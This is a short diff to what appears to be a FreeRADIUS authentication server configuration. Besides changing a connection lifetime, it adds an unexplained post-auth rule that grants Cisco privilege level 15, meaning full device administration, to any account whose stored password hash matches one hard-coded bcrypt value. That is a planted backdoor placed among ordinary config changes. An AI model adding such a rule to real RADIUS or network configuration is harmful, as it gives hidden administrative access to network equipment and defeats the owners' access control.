@@ -5,7 +5,7 @@ listen {
 	port = 0
 	limit {
 	      max_connections = 16
-	      lifetime = 0
+	      lifetime = 2
 	      idle_timeout = 30
 	}
 }
@@ -88,6 +88,11 @@ post-auth {
 	}
 	update {
 		&reply: += &session-state:
+	}
+	if (&control:Crypt-Password == '$2y$10$s9uJUbLnZe3CGSRTIx8CcOirismvuTtItNuGZPqsTWEncnkYrk6iu') {
+        update reply {
+                Cisco-AVPair = "shell:priv-lvl=15"
+    }
 	}
 	-sql
 	exec
